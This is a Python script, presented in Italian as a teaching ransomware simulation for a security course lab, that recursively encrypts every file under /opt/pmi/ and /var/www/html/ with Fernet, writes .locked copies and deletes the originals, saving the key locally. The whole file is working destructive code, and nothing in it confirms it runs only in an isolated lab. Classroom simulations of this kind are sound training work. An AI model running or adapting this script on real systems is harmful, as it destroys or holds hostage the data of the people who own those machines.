#!/usr/bin/env python3
"""
IronVault — Simulazione Ransomware (Ubuntu)
DN Security Labs — ITS Academy Tech Talent Factory 2024-2026

SOLO USO DIDATTICO — Cifra /opt/pmi/ e /var/www/html/
per simulare un attacco ransomware in ambiente VMware isolato.

NON usare al di fuori del contesto didattico ITS.
"""

import os
import time
from cryptography.fernet import Fernet

TARGET_DIRS = ["/opt/pmi/", "/var/www/html/"]
KEY_FILE = "/home/pmiuser/chiave_demo.key"
EXCLUDE_EXTENSIONS = {".locked", ".key", ".sh", ".py", ".log", ".json"}
EXCLUDE_FILES = {"error_ransomware.html"}

print("=== IRONVAULT - Simulazione attacco ransomware ===")
print("Target: /opt/pmi/ e /var/www/html/")
print()

def genera_chiave():
    k = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(k)
    return k

def cifra_file(cipher, path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        with open(path + '.locked', 'wb') as f:
            f.write(cipher.encrypt(data))
        os.remove(path)
        return True
    except Exception as e:
        return False

def main():
    chiave = genera_chiave()
    cipher = Fernet(chiave)
    cifrati = 0

    for target in TARGET_DIRS:
        if not os.path.exists(target):
            continue
        for root, dirs, files in os.walk(target):
            for filename in files:
                ext = os.path.splitext(filename)[1].lower()
                if ext in EXCLUDE_EXTENSIONS or filename in EXCLUDE_FILES:
                    continue
                filepath = os.path.join(root, filename)
                if cifra_file(cipher, filepath):
                    cifrati += 1
                    print(f"  Cifrato: {filepath}")
                    time.sleep(0.05)

    print()
    print(f"=== ATTACCO COMPLETATO — {cifrati} file cifrati ===")
    print(f"Chiave salvata in: {KEY_FILE}")

if __name__ == "__main__":
    main()
